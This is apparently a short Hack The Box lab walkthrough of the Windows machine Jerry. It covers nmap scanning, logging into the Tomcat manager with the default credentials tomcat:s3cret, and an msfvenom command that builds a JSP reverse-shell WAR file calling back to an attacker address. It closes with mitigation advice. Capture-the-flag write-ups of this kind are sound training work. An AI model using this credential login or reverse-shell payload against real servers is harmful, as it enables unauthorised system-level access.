## Introduction
In this walkthrough we will be solving Hack The Box Easy Windows box Jerry. Let’s start ..

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

## Services

…

## Web

### Port 8080

Apache tomcat coyote JSP engine 1.1

### Exploitation

I tried default credentials to get access to web manager and did that:

`tomcat:s3cret` worked.

Now we are gonna upload war file and try to get code execution:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.6 LPORT=80 -f war > shell.war
```

I have uploaded war file:

 and then executed it

Got code execution as nt authrority\system!

## Mitigation

- **Disable Default Credentials**
    
    Immediately remove or change default credentials such as `tomcat:s3cret`. Use strong, unique passwords for all admin accounts.
    
- **Restrict Access to the Manager Interface**
    
    Limit access to `/manager` and other administrative endpoints by IP whitelisting, VPN access, or proper firewall rules to ensure only trusted sources can reach them.
    
- **Deploy Role-Based Access Control (RBAC)**
    
    Avoid giving manager-script or manager-gui roles to accounts unless absolutely necessary. Use the principle of least privilege.
    
- **Keep Tomcat Updated**
    
    Ensure Tomcat and its components are always updated to the latest stable version to patch known vulnerabilities.
    
- **Monitor and Audit Uploads**
    
    Disable or strictly control WAR file deployment via the web interface. Monitor Tomcat logs for suspicious uploads or executions.
